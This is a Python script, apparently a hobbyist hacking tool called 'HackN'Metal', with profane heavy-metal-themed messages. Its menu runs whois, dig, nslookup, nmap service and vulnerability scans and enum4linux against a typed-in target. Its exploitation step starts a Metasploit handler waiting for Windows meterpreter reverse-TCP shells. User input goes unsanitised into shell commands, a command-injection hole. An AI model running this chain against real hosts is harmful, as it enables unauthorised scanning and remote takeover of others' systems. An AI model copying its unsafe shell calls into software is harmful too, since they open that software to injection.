import os
import subprocess

def print_header():
    print(r"""
 _    _            _     _   _      __  __      _        _ 
| |  | |          (_)   | | | |    |  \/  |    | |      | |
| |__| | __ _ _ __ _ ___| |_| | ___| \  / | ___| |_ __ _| |
|  __  |/ _` | '__| / __| __| |/ _ \ |\/| |/ _ \ __/ _` | |
| |  | | (_| | |  | \__ \ |_| |  __/ |  | |  __/ || (_| | |
|_|  |_|\__,_|_|  |_|___/\__|_|\___|_|  |_|\___|\__\__,_|_|
----------------------------------------------------------
Created with chaos by sleep33""")

def print_footer():
    print("""
-------------------------------------------------------
                Created with chaos by sleep33
-------------------------------------------------------
    """)

def reconnaissance(target):
    print("[+] Running whois like it's a f***ing guitar riff...")
    os.system(f"whois {target}")
    
    print("[+] Digging deep into your DNS like a power chord from hell!")
    os.system(f"dig {target}")
    
    print("[+] Reverse IP lookup, because we don’t f***ing stop!")
    os.system(f"nslookup {target}")

def scanning(target):
    print("[+] Scanning ports harder than a Meshuggah riff... Hold tight!")
    os.system(f"nmap -sV {target}")

def enumeration(target):
    print("[+] Enumerating services like a double kick drum — BOOM BOOM!")
    os.system(f"enum4linux {target}")

def vulnerability_scanning(target):
    print("[+] Hunting for vulnerabilities like you're hunting down a lost vinyl... hardcore!")
    os.system(f"nmap --script vuln {target}")

def exploitation():
    print("[+] Time to f***ing exploit this! We're going full Metallica circa '86 on this system!")
    os.system("msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; exploit'")

def run_all(target):
    print(f"[+] Grabbing {target} by the throat and running every f***ing test at once!")
    reconnaissance(target)
    scanning(target)
    enumeration(target)
    vulnerability_scanning(target)
    exploitation()

def show_menu():
    print("-----------------------------------")
    print("HackN’Metal — Hacking with Attitude!")
    print("-----------------------------------")
    print("1. Reconnaissance (Dig Deep Like a Heavy Bassline)")
    print("2. Scanning (Ports are gonna tremble)")
    print("3. Enumeration (Find who’s playing what in this network jam)")
    print("4. Vulnerability Scanning (Someone here is weak as f***)")
    print("5. Exploitation (It’s time to destroy!)")
    print("6. Run All Tests (Cause you don’t have time for bullshit)")
    print("7. Exit and go blast some f***ing metal!")
    print("-----------------------------------")
    choice = input("Your move, badass. Pick something [1-7]: ")
    return choice

def handle_choice(choice):
    if choice == '1':
        target = input("Give me a target for Reconnaissance, you beast: ")
        reconnaissance(target)
    elif choice == '2':
        target = input("Give me a target for Scanning, you metalhead: ")
        scanning(target)
    elif choice == '3':
        target = input("Give me a target for Enumeration, you relentless headbanger: ")
        enumeration(target)
    elif choice == '4':
        target = input("Give me a target for Vulnerability Scanning, you hacker from hell: ")
        vulnerability_scanning(target)
    elif choice == '5':
        target = input("Give me a target for Exploitation, because it's time to f***ing wreck things: ")
        exploitation()
    elif choice == '6':
        target = input("Give me a target to unleash everything on, cause we’re not f***ing around: ")
        run_all(target)
    elif choice == '7':
        print("Alright, go crank up the metal and headbang yourself out of here!")
        exit(0)
    else:
        print("What the f*** are you doing? Pick a valid number, headbanger!")

def main():
    print_header()
    while True:
        choice = show_menu()
        handle_choice(choice)
    print_footer()

if __name__ == '__main__':
    main()
